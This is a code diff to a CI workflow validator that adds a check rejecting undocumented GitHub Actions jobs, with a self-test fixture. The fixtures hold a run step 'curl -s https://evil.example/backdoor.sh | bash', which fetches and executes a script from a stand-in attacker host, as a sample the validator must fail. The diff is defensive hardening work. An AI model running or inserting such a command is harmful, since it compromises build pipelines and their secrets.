@@ -143,12 +143,20 @@ CONDUCTOR_GATES = (
     ),
 )
 CONDUCTOR_REQUIRED_COMMANDS = tuple(command for command, _, _ in CONDUCTOR_GATES)
+# The complete, exact set of jobs this file knows how to validate. Every
+# check downstream (SHA-pin scan, per-job step checks) only ever inspects
+# jobs by these names, so an undocumented extra job must be rejected — see
+# the exact-set check in validate_workflow() — or it would run completely
+# unreviewed.
+CI_JOB_NAMES = ("validate", "security", "docker-build")
 # ci.yml validate-job steps that legitimately run something other than a gate.
 CI_VALIDATE_SUPPORT_STEPS = frozenset({"Install dependencies", "Check whitespace"})
 # Every named `run:` step in jobs.security and jobs.docker-build. Each one is
 # individually validated below (require_run_pattern/step_by_name); this set
 # exists only so an entirely new, unvalidated named step can be rejected by
-# require_known_run_steps() instead of silently running unreviewed.
+# require_known_run_steps() instead of silently running unreviewed. Keep
+# these names in lockstep with the step_run()/step_by_name() calls below —
+# adding, renaming, or removing a named step requires updating both.
 CI_SECURITY_STEPS = frozenset(
     {
         "Audit runtime Python dependencies",
@@ -315,7 +323,7 @@ def workflow_jobs() -> dict:
     jobs = workflow.get("jobs")
     if not isinstance(jobs, dict):
         fail(".github/workflows/ci.yml must define jobs")
-    for name in ["validate", "security", "docker-build"]:
+    for name in CI_JOB_NAMES:
         if name not in jobs:
             fail(f".github/workflows/ci.yml must define jobs.{name}")
         if not isinstance(jobs[name], dict):
@@ -387,6 +395,23 @@ def require_known_run_steps(steps: list[dict], known_names, job_name: str) -> No
 
 def validate_workflow(jobs=None) -> None:
     jobs = workflow_jobs() if jobs is None else jobs
+
+    # Every check below only ever inspects jobs.validate/security/docker-build
+    # by name. Without this, a brand-new job (e.g. jobs.deploy) with its own
+    # unpinned actions and unreviewed run: steps would never be looked at by
+    # anything in this file — the same "unseen name skips every check" bug
+    # already closed at the step level (duplicate names, then undocumented
+    # steps within an existing job), recurring one level up at job
+    # granularity.
+    extra_jobs = sorted(set(jobs) - set(CI_JOB_NAMES))
+    if extra_jobs:
+        fail(
+            f".github/workflows/ci.yml defines undocumented job(s) {extra_jobs}; "
+            "add them to CI_JOB_NAMES in scripts/validate_repository.py and "
+            "give them the same validation as validate/security/docker-build, "
+            "or remove them"
+        )
+
     validate_steps = job_steps(jobs, "validate")
     security_steps = job_steps(jobs, "security")
     docker_steps = job_steps(jobs, "docker-build")
@@ -1528,6 +1553,27 @@ def run_self_test() -> None:
                         "run": "curl -s https://evil.example/backdoor.sh | bash",
                     }
                 ],
+            )
+        ),
+    )
+    # workflow_with() only mutates steps within an existing job, so an
+    # entirely new job needs its own fixture: a brand-new, undocumented job
+    # must fail even though validate/security/docker-build are all present
+    # and untouched.
+    expect_fail(
+        "workflow undocumented extra job",
+        lambda: validate_workflow(
+            dict(
+                copy.deepcopy(base_jobs),
+                deploy={
+                    "runs-on": "ubuntu-latest",
+                    "steps": [
+                        {
+                            "name": "Totally new deploy step",
+                            "run": "curl -s https://evil.example/backdoor.sh | bash",
+                        }
+                    ],
+                },
             )
         ),
     )
